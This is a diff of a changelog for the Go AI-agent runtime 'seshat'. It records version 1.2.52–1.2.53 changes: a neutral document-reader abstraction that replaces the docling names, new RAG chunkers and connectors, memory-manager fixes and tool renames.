+## [1.2.53] - 2026-09-26
+
+### Added
+- `internal/documentreader`/`pkg/documentreader`: a neutral document-reader abstraction plus `GenericClient`, a configurable client for any document-intelligence HTTP server that accepts a multipart file upload and returns JSON (the shape docling-serve, seshat-intelligence, marker-style services, and similar backends can all share). Every protocol detail (paths, the multipart file field name, response parsing via `ConvertParser`/`ChunkParser`) is supplied by the caller through `GenericConfig`, so a concrete backend's own adapter can live downstream without renaming Seshat internals again. Validated against a real, running seshat-intelligence instance, including live conversion and hybrid-chunk round trips.
+
+### Changed
+- Document conversion configuration moved from `DoclingURL`/`docling_url` to `DocumentReaderURL`/`document_reader_url`; callers can still inject a custom `documentreader.Converter` directly.
+- The TUI no longer starts a managed document-conversion service by default. It only starts the bundled docling-serve adapter when `DocumentReaderURL` is explicitly set to `docling:auto`, then replaces that sentinel with the managed local base URL.
+- The public RAG document-aware chunker is now `HybridDocumentChunker`/`NewHybridDocumentChunkerForProfile`, with neutral metadata (`chunker=document_hybrid`, `document_reader_*`) instead of docling-shaped names.
+- The explicit document conversion tool is now `convert_document` instead of `docling_convert`.
+- The concrete docling-serve HTTP adapter remains internal implementation detail under `internal/documentreader`; the public package now exposes only neutral document-reader interfaces, result types, and the generic HTTP client.
+
+### Removed
+- Removed the public `pkg/docling` and `pkg/python` facades, plus internal/tool packages named `docling`.
+- Removed the old exported names `DoclingURL`, `DoclingChunker`, `NewDoclingChunker*`, `DoclingChunkOptionsForProfile`, `FileTypeDocling`, and `DoclingFileResult`.
+
+## [1.2.52] - 2026-09-25
+
+### Added
+- `internal/nativedoc`, `internal/pdfsmart`, `internal/rag` (re-exported via `pkg/nativedoc`, `pkg/pdfsmart`, `pkg/rag`, `pkg/model`): the document-intelligence roadmap's Phases 1-4 - native (Go/CGO, no external service) PDF/DOCX/XLSX parsing with OCR/layout/table-structure via ported-and-adapted RAGFlow components (opt-in behind the `nativedoc` build tag; Windows/Linux/macOS all validated), opt-in chunk-level LLM enrichment (`rag.Enricher`/`rag.SetEnricher` - synthetic questions per chunk folded into embedded text only, never into stored/returned chunk text), an opt-in vision-LLM fallback for `pdfsmart.Convert` (`pdfsmart.VisionFallback`) for a page that still has no usable text after native extraction and docling, and two new chunk profiles/chunkers (`rag.TableChunker`/`ChunkProfileTable` - keeps GFM table rows intact, repeating the header row on an oversized split instead of a generic splitter cutting through a table; `rag.QAChunker`/`ChunkProfileQA` - one chunk per detected Q/A pair, from either `Q:`/`A:` labels or Markdown headings ending in `?`). New public packages: `pkg/nativedoc`, `internal/rag/enricher`/`pkg/rag/enricher`, `internal/pdfsmart/vision`/`pkg/pdfsmart/vision`, `pkg/model` (a small facade over `internal/model`'s LLM capability registry, needed so `pdfsmart/vision.Config.Registry` isn't an internal type leaking into a public signature). See `docs/issues/document-intelligence-roadmap.md` for the full design log.
 - `pkg/connectors`: Google Drive, SharePoint, OneDrive, S3-compatible, Azure Blob, Confluence, and Notion Discover/Sync connectors, moved here from seshat-ai's private `seshat-core/connectors` module - tenant-agnostic mechanism (no organization/user/ACL concepts), previously duplicated across seshat-ai's desktop and server products before being extracted into a shared internal module; now a public capability of the runtime itself, matching how the rest of `pkg/` already separates mechanism (here) from product policy (seshat-ai). Same code, same tests, only the import path changes for existing consumers.
 - `pkg/gmail`: Gmail API client (messages, threads, drafts, send), moved here from seshat-ai's private `seshat-core/gmail` module for the same reason as `pkg/connectors` above.
 - `pkg/msgraph`: Microsoft Graph API client (mail, Teams), moved here from seshat-ai's private `seshat-core/msgraph` module for the same reason as `pkg/connectors` above.
@@ -21,6 +272,7 @@ Versioning: [Semantic Versioning](https://semver.org/spec/v2.0.0.html).
 - `internal/rag`: `HeadingChunker` gives the `structured` chunk profile real structural awareness - it recognizes Markdown headings, numbered outline notation (`1.2.3`), and EN/FR legal-structural keywords (Part/Chapter/Section/Article/Clause, Partie/Chapitre/Article/Clause/Annexe), chunks along whichever hierarchy it finds, and attaches the full ancestor-heading path to each chunk (both in its text and in `Metadata["heading_path"]`) - instead of the profile being only a token-size preset with no structural behavior. `NewDoclingChunkerForProfile` now uses it as the `structured` profile's fallback (when docling-serve is unavailable/fails) instead of plain paragraph splitting; every other profile is unaffected. A document with no recognizable heading falls back to today's plain paragraph chunking exactly.
 
 ### Changed
+- `pkg/pdfsmart`/`internal/pdfsmart`: `Convert` gains a fourth parameter, `vision VisionFallback` - breaking change to `pkg/pdfsmart.Convert`'s external callers (seshat-backend). Bundled into one struct (`VisionFallback{Renderer, Transcriber}`) rather than two more positional parameters so a future fallback stage doesn't force another breaking signature change; `VisionFallback{}` (zero value) disables the stage entirely, matching how a nil docling client already disabled the docling stage.
 - `internal/rag`: `Service.DeleteFileChunks` no longer takes a `(fromChunk, toChunk)` range - it now takes a single `keepBelow int` and lists every record actually present in the namespace, deleting whichever ones still carry the given `artifact_key` at or past that position. The old range-based version guessed an upper bound (a fixed ceiling past the new chunk count) rather than checking what was really there - see the matching Fixed entry below for why that silently lost data on large files.
 - `internal/memory`: `Manager` no longer holds a single implicit "currently loaded project" - `project *ProjectMemory` became `projects map[string]*ProjectMemory`, keyed by the new `ProjectID(path)`. Every project-scoped method (`GetProject`, `SaveProject`, `Context`, `StoreEntry`, `LearnPreference`/`LearnInstruction`, `LearnToolUsage`, `GetToolUsagePatterns`, `Search`) now takes an explicit `projectID` parameter instead of relying on whichever project was loaded most recently. `LoadProject`/`LoadAll` return that ID. Breaking change to `internal/memory`'s API (not exported via `pkg/`, so no public SDK impact) - fixes a real bug, not just an API cleanup: a single `Engine` reused across sessions for different projects used to silently clobber one session's project memory with another's the moment a second `LoadProject` call landed, since both wrote through the same field.
 - `internal/memory`: project IDs are now `ProjectID(path)`, a SHA256 hash of the canonical absolute path - replaces the old `getProjectRootID`, which returned `filepath.Base(projectPath)` unconditionally for any git-tracked project (the common case), so two different repositories sharing a directory name (`/home/a/backend`, `/home/b/backend`) collided on the same memory file. This changes existing users' project-memory filenames on upgrade (old files are orphaned, not migrated) - the same trade-off the previous non-git fallback (an `fnv32` path hash) already made.
@@ -235,7 +487,7 @@ a real ChatGPT-account session (documented in
 - `write_pdf` tool: create/append/delete-pages PDFs via `go-pdf/fpdf` + `pdfcpu` — no headless-browser dependency.
 - `search_start` tool: cancellable, streaming background content search (reuses `job_output`/`job_kill`) that also searches inside `.docx`/`.pptx`/`.xlsx` content, which ripgrep can't see.
 - `get_config` tool (read-only): exposes the effective security policy — denied command fragments/patterns, commands requiring approval, read/write-denied path prefixes, file-read limits, sandbox availability, default shell.
-- `internal/tools/files/docling` package: `read_document_url` (moved from `files/read_url`) plus new `docling_convert` for explicit local-file conversion (OCR, complex slide decks, audio transcription) — FileRead's own automatic docling fallback is unchanged.
+- `internal/tools/files/documentreader` package: `read_document_url` (moved from `files/read_url`) plus new `convert_document` for explicit local-file conversion (OCR, complex slide decks, audio transcription) — FileRead's own automatic document-reader fallback is unchanged.
 - `rag_delete` tool: delete an entire corpus or a single file's chunks — previously unreachable capability (`Service.DeleteNamespace`/`DeleteFileChunks` existed but no tool exposed them).
 - `rag_ingest` gains an optional `file_id` param (defaults to `filename`) for idempotent re-ingest — re-ingesting the same file now replaces its chunks instead of accumulating duplicates.
 - **Vectorless RAG**: `rag_ingest`/`rag_search` now work without any embedding provider configured, via pure BM25/keyword ranking (real BM25 through SQLite FTS5; keyword-overlap scoring on HNSW/Memory). Previously RAG was hard-disabled with no embedder at all.
@@ -286,5 +538,9 @@ a real ChatGPT-account session (documented in
 - `internal/tools/special/brief`: a "send message to the user" tool from the pre-rename codebase, never registered at any point in its history.
 - `internal/tools/special/config/configTool.go`: an arbitrary key/value settings store predating the current `contract.Tool` interface (incompatible signatures — could never have been registered as-is), replaced by the real `get_config` tool.
 
-[Unreleased]: https://github.com/KPO-Tech/seshat/compare/v1.1.0...HEAD
+[Unreleased]: https://github.com/KPO-Tech/seshat/compare/v1.2.55...HEAD
+[1.2.55]: https://github.com/KPO-Tech/seshat/compare/v1.2.54...v1.2.55
+[1.2.54]: https://github.com/KPO-Tech/seshat/compare/v1.2.53...v1.2.54
+[1.2.53]: https://github.com/KPO-Tech/seshat/compare/v1.2.52...v1.2.53
+[1.2.52]: https://github.com/KPO-Tech/seshat/compare/v1.2.51...v1.2.52
 [1.1.0]: https://github.com/KPO-Tech/seshat/compare/v1.0.4...v1.1.0
